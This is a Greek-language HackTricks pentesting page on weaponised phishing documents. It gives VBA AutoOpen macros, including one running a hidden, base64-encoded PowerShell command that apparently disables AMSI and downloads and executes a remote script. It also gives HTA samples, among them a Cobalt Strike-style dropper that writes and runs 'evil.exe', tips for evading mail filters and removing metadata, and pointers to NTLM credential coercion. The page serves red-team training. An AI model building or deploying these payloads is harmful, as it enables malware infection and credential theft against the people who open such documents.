# Αρχεία και Έγγραφα Φισίνγκ

<details>

<summary><strong>Μάθετε το χάκινγκ του AWS από το μηδέν μέχρι τον ήρωα με το</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

* Εργάζεστε σε μια **εταιρεία κυβερνοασφάλειας**; Θέλετε να δείτε την **εταιρεία σας να διαφημίζεται στο HackTricks**; Ή θέλετε να έχετε πρόσβαση στην **τελευταία έκδοση του PEASS ή να κατεβάσετε το HackTricks σε μορφή PDF**; Ελέγξτε τα [**ΠΛΑΝΑ ΣΥΝΔΡΟΜΗΣ**](https://github.com/sponsors/carlospolop)!
* Ανακαλύψτε την [**Οικογένεια PEASS**](https://opensea.io/collection/the-peass-family), τη συλλογή μας από αποκλειστικά [**NFTs**](https://opensea.io/collection/the-peass-family)
* Αποκτήστε το [**επίσημο PEASS & HackTricks swag**](https://peass.creator-spring.com)
* **Εγγραφείτε στην** [**💬**](https://emojipedia.org/speech-balloon/) [**ομάδα Discord**](https://discord.gg/hRep4RUj7f) ή στην [**ομάδα telegram**](https://t.me/peass) ή **ακολουθήστε** με στο **Twitter** 🐦[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Μοιραστείτε τα χάκινγκ κόλπα σας υποβάλλοντας PRs στο [αποθετήριο hacktricks](https://github.com/carlospolop/hacktricks) και [αποθετήριο hacktricks-cloud](https://github.com/carlospolop/hacktricks-cloud)**.

</details>

## Έγγραφα Γραφείου

Το Microsoft Word πραγματοποιεί επικύρωση δεδομένων αρχείου πριν ανοίξει ένα αρχείο. Η επικύρωση δεδομένων πραγματοποιείται στη μορφή αναγνώρισης δομής δεδομένων, σύμφωνα με το πρότυπο OfficeOpenXML. Εάν συμβεί οποιοδήποτε σφάλμα κατά την αναγνώριση της δομής δεδομένων, το αρχείο που αναλύεται δεν θα ανοίξει.

Συνήθως, τα αρχεία Word που περιέχουν μακρόχρονες χρησιμοποιούν την επέκταση `.docm`. Ωστόσο, είναι δυνατό να μετονομάσετε το αρχείο αλλάζοντας την επέκταση του αρχείου και να διατηρήσετε τις δυνατότητες εκτέλεσης των μακρόχρονων.\
Για παράδειγμα, ένα αρχείο RTF δεν υποστηρίζει μακρόχρονες, κατά σχεδιασμό, αλλά ένα αρχείο DOCM που μετονομάζεται σε RTF θα χειριστείται από το Microsoft Word και θα είναι ικανό για εκτέλεση μακρόχρονων.\
Οι ίδιες εσωτερικές δομές και μηχανισμοί ισχύουν για όλο το λογισμικό της σουίτας Microsoft Office (Excel, PowerPoint κ.λπ.).

Μπορείτε να χρησιμοποιήσετε την παρακάτω εντολή για να ελέγξετε ποιες επεκτάσεις θα εκτελεστούν από ορισμένα προγράμματα Office:
```bash
assoc | findstr /i "word excel powerp"
```
Τα αρχεία DOCX που αναφέρονται σε απομακρυσμένο πρότυπο (Αρχείο - Επιλογές - Πρόσθετα - Διαχείριση: Πρότυπα - Πήγαινε) που περιλαμβάνει μακρό μπορούν επίσης να "εκτελέσουν" μακρό.

### Φόρτωση Εξωτερικής Εικόνας

Πηγαίνετε σε: _Εισαγωγή -> Γρήγορα Μέρη -> Πεδίο_\
_**Κατηγορίες**: Συνδέσμοι και Αναφορές, **Ονόματα πεδίων**: includePicture, και **Όνομα αρχείου ή URL**: http://\<ip>/whatever

![](<../../.gitbook/assets/image (316).png>)

### Παρασκήνιο Μακρό

Είναι δυνατόν να χρησιμοποιηθούν μακρό για να εκτελέσουν αυθαίρετο κώδικα από το έγγραφο.

#### Λειτουργίες Αυτόματης Φόρτωσης

Όσο πιο κοινές είναι, τόσο πιο πιθανό είναι να τις ανιχνεύσει ο Αντιιικός Λογισμικός.

* AutoOpen()
* Document\_Open()

#### Παραδείγματα Κώδικα Μακρό
```vba
Sub AutoOpen()
CreateObject("WScript.Shell").Exec ("powershell.exe -nop -Windowstyle hidden -ep bypass -enc JABhACAAPQAgACcAUwB5AHMAdABlAG0ALgBNAGEAbgBhAGcAZQBtAGUAbgB0AC4AQQB1AHQAbwBtAGEAdABpAG8AbgAuAEEAJwA7ACQAYgAgAD0AIAAnAG0AcwAnADsAJAB1ACAAPQAgACcAVQB0AGkAbABzACcACgAkAGEAcwBzAGUAbQBiAGwAeQAgAD0AIABbAFIAZQBmAF0ALgBBAHMAcwBlAG0AYgBsAHkALgBHAGUAdABUAHkAcABlACgAKAAnAHsAMAB9AHsAMQB9AGkAewAyAH0AJwAgAC0AZgAgACQAYQAsACQAYgAsACQAdQApACkAOwAKACQAZgBpAGUAbABkACAAPQAgACQAYQBzAHMAZQBtAGIAbAB5AC4ARwBlAHQARgBpAGUAbABkACgAKAAnAGEAewAwAH0AaQBJAG4AaQB0AEYAYQBpAGwAZQBkACcAIAAtAGYAIAAkAGIAKQAsACcATgBvAG4AUAB1AGIAbABpAGMALABTAHQAYQB0AGkAYwAnACkAOwAKACQAZgBpAGUAbABkAC4AUwBlAHQAVgBhAGwAdQBlACgAJABuAHUAbABsACwAJAB0AHIAdQBlACkAOwAKAEkARQBYACgATgBlAHcALQBPAGIAagBlAGMAdAAgAE4AZQB0AC4AVwBlAGIAQwBsAGkAZQBuAHQAKQAuAGQAbwB3AG4AbABvAGEAZABTAHQAcgBpAG4AZwAoACcAaAB0AHQAcAA6AC8ALwAxADkAMgAuADEANgA4AC4AMQAwAC4AMQAxAC8AaQBwAHMALgBwAHMAMQAnACkACgA=")
End Sub
```

```vba
Sub AutoOpen()

Dim Shell As Object
Set Shell = CreateObject("wscript.shell")
Shell.Run "calc"

End Sub
```

```vba
Dim author As String
author = oWB.BuiltinDocumentProperties("Author")
With objWshell1.Exec("powershell.exe -nop -Windowsstyle hidden -Command-")
.StdIn.WriteLine author
.StdIn.WriteBlackLines 1
```

```vba
Dim proc As Object
Set proc = GetObject("winmgmts:\\.\root\cimv2:Win32_Process")
proc.Create "powershell <beacon line generated>
```
#### Χειροκίνητη αφαίρεση μεταδεδομένων

Πηγαίνετε σε **Αρχείο > Πληροφορίες > Επιθεώρηση εγγράφου > Επιθεώρηση εγγράφου**, το οποίο θα εμφανίσει τον Επιθεωρητή Εγγράφου. Κάντε κλικ στο **Επιθεώρηση** και στη συνέχεια στο **Αφαίρεση όλων** δίπλα στις **Ιδιότητες εγγράφου και προσωπικές πληροφορίες**.

#### Επέκταση αρχείου

Όταν τελειώσετε, επιλέξτε την αναπτυσσόμενη λίστα **Αποθήκευση ως τύπος**, αλλάξτε τη μορφή από **`.docx`** σε **Word 97-2003 `.doc`**.\
Κάντε αυτό επειδή **δεν μπορείτε να αποθηκεύσετε μακροεντολές μέσα σε ένα `.docx`** και υπάρχει μια **στίγμα** γύρω από την επέκταση των μακροεντολών **`.docm`** (π.χ. το εικονίδιο μικρογραφίας έχει ένα τεράστιο `!` και ορισμένες πύλες ιστού/ηλεκτρονικού ταχυδρομείου τις αποκλείουν εντελώς). Επομένως, αυτή η **παλαιά επέκταση `.doc` είναι η καλύτερη συμβιβαστική λύση**.

#### Δημιουργοί κακόβουλων μακροεντολών

* MacOS
* [**macphish**](https://github.com/cldrn/macphish)
* [**Mythic Macro Generator**](https://github.com/cedowens/Mythic-Macro-Generator)

## Αρχεία HTA

Ένα αρχείο HTA είναι ένα πρόγραμμα των Windows που **συνδυάζει HTML και γλώσσες σεναρίου (όπως VBScript και JScript)**. Δημιουργεί τη διεπαφή χρήστη και εκτελείται ως μια "πλήρως αξιόπιστη" εφαρμογή, χωρίς τους περιορισμούς του μοντέλου ασφαλείας ενός προγράμματος περιήγησης.

Ένα αρχείο HTA εκτελείται χρησιμοποιώντας το **`mshta.exe`**, το οποίο συνήθως **εγκαθίσταται** μαζί με το **Internet Explorer**, καθιστώντας το **`mshta` εξαρτημένο από το IE**. Έτσι, αν έχει απεγκατασταθεί, τα αρχεία HTA δεν θα μπορούν να εκτελεστούν.
```html
<--! Basic HTA Execution -->
<html>
<head>
<title>Hello World</title>
</head>
<body>
<h2>Hello World</h2>
<p>This is an HTA...</p>
</body>

<script language="VBScript">
Function Pwn()
Set shell = CreateObject("wscript.Shell")
shell.run "calc"
End Function

Pwn
</script>
</html>
```

```html
<--! Cobal Strike generated HTA without shellcode -->
<script language="VBScript">
Function var_func()
var_shellcode = "<shellcode>"

Dim var_obj
Set var_obj = CreateObject("Scripting.FileSystemObject")
Dim var_stream
Dim var_tempdir
Dim var_tempexe
Dim var_basedir
Set var_tempdir = var_obj.GetSpecialFolder(2)
var_basedir = var_tempdir & "\" & var_obj.GetTempName()
var_obj.CreateFolder(var_basedir)
var_tempexe = var_basedir & "\" & "evil.exe"
Set var_stream = var_obj.CreateTextFile(var_tempexe, true , false)
For i = 1 to Len(var_shellcode) Step 2
var_stream.Write Chr(CLng("&H" & Mid(var_shellcode,i,2)))
Next
var_stream.Close
Dim var_shell
Set var_shell = CreateObject("Wscript.Shell")
var_shell.run var_tempexe, 0, true
var_obj.DeleteFile(var_tempexe)
var_obj.DeleteFolder(var_basedir)
End Function

var_func
self.close
</script>
```
## Εξαναγκασμός Ταυτοποίησης NTLM

Υπάρχουν αρκετοί τρόποι για να **εξαναγκάσετε την ταυτοποίηση NTLM "απομακρυσμένα"**, για παράδειγμα, μπορείτε να προσθέσετε **αόρατες εικόνες** σε emails ή HTML που ο χρήστης θα αποκτήσει πρόσβαση (ακόμα και HTTP MitM;). Ή να στείλετε στο θύμα τη **διεύθυνση αρχείων** που θα **ενεργοποιήσει** μια **ταυτοποίηση** μόνο για το **άνοιγμα του φακέλου**.

**Ελέγξτε αυτές τις ιδέες και περισσότερα στις παρακάτω σελίδες:**

{% content-ref url="../../windows-hardening/active-directory-methodology/printers-spooler-service-abuse.md" %}
[printers-spooler-service-abuse.md](../../windows-hardening/active-directory-methodology/printers-spooler-service-abuse.md)
{% endcontent-ref %}

{% content-ref url="../../windows-hardening/ntlm/places-to-steal-ntlm-creds.md" %}
[places-to-steal-ntlm-creds.md](../../windows-hardening/ntlm/places-to-steal-ntlm-creds.md)
{% endcontent-ref %}

### NTLM Relay

Μην ξεχάσετε ότι μπορείτε όχι μόνο να κλέψετε το hash ή την ταυτοποίηση αλλά και να **εκτελέσετε επιθέσεις NTLM relay**:

* [**Επιθέσεις NTLM Relay**](../pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md#ntml-relay-attack)
* [**AD CS ESC8 (NTLM relay σε πιστοποιητικά)**](../../windows-hardening/active-directory-methodology/ad-certificates/domain-escalation.md#ntlm-relay-to-ad-cs-http-endpoints-esc8)

<details>

<summary><strong>Μάθετε το hacking στο AWS από το μηδέν μέχρι τον ήρωα με το</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

* Εργάζεστε σε μια **εταιρεία κυβερνοασφάλειας**; Θέλετε να δείτε την **εταιρεία σας να διαφημίζεται στο HackTricks**; Ή θέλετε να έχετε πρόσβαση στην **τελευταία έκδοση του PEASS ή να κατεβάσετε το HackTricks σε μορφή PDF**; Ελέγξτε τα [**ΠΑΚΕΤΑ ΣΥΝΔΡΟΜΗΣ**](https://github.com/sponsors/carlospolop)!
* Ανακαλύψτε [**την Οικογένεια PEASS**](https://opensea.io/collection/the-peass-family), τη συλλογή μας από αποκλειστικά [**NFTs**](https://opensea.io/collection/the-peass-family)
* Αποκτήστε το [**επίσημο PEASS & HackTricks swag**](https://peass.creator-spring.com)
* **Εγγραφείτε στην** [**💬**](https://emojipedia.org/speech-balloon/) [**ομάδα Discord**](https://discord.gg/hRep4RUj7f) ή στην [**ομάδα telegram**](https://t.me/peass) ή **ακολουθήστε** με στο **Twitter** 🐦[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Μοιραστείτε τα hacking tricks σας υποβάλλοντας PRs στο [αποθετήριο hacktricks](https://github.com/carlospolop/hacktricks) και [αποθετήριο hacktricks-cloud](https://github.com/carlospolop/hacktricks-cloud)**.

</details>
